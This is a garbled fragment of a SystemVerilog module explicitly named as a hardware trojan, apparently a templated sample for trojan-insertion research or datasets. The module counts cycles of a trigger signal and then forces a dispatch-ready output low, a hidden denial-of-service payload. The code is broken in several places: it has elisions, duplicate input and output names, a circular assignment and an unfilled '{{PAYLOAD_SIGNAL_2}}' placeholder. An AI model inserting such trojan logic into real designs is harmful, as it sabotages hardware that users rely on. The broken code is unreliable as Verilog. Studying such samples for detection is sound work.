...
module TestSourceCAM_Top_trojan (
    input  logic clk_p,
    input  logic rstOut,
    
    // Original module signals (passthrough)
    input  logic unpackedDispatchedSrcReady,
    output logic unpackedDispatchedSrcReady,
    ...
    always_ff @(posedge clk_p or negedge rstOut) begin
        if (!rstOut) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            // Increment counter when trigger signal is active
            if (unpackedDispatchedSrcReady) begin
    ...
    assign unpackedDispatchedSrcReady = trojan_active ? 1'b0 : unpackedDispatchedSrcReady_normal;
    ...
    logic unpackedDispatchedSrcReady_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign unpackedDispatchedSrcReady_normal = unpackedDispatchedSrcReady;
 ...
 *     input  logic clk_i,           // clk_p
 *     input  logic rst_ni,          // rstOut
 *     input  logic instr_valid_i,   // unpackedDispatchedSrcReady
 *     output logic instr_valid_o    // unpackedDispatchedSrcReady
 * );
